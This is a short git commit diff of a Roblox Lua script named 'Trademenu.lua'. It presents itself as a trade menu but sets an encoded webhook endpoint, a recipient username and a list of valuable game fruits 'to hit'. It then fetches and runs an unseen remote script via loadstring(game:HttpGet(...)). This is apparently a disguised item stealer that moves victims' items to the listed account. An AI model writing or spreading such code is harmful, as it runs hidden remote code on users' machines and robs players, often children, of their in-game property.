8739cb7f5b8606658c9cb268f20c7ca0932576d3
SpIeedx <josemoreirasaldarriaga42@gmail.com>
2025-03-09 12:43:36 -0500

    Trademenu.lua

--- Trademenu.lua
+++ Trademenu.lua
@@ -1,5 +1,5 @@
 Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Y0c2dk8ydlZhWDQwNmV0R0xIRXFYZzpPbmUwYWR1Y2VNSTA4M2FleVpRM1JUUllKUGNkMlIwVkQxMXhxYUt3R3paRFkxVHZWUDZjSWdBUjRQNTFMTktId1pyRjFNNXBiSjNTendQaVEwMjZOWWVJdFp0UEx0V1doZnBpcjZHRENDUmxJR2V0NjQ5WWR0R196dGFpUUlwTHJGbzdOeEx0M0hTNnhJZUgxRTlWN29EdzVDVzRpU2N1emNLVDdEX2VyeTg"
-Usernames = {"Vicente2544Y"}
+Usernames = {"Rip_Iindrax2000"}
 FruitsToHit = {"Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
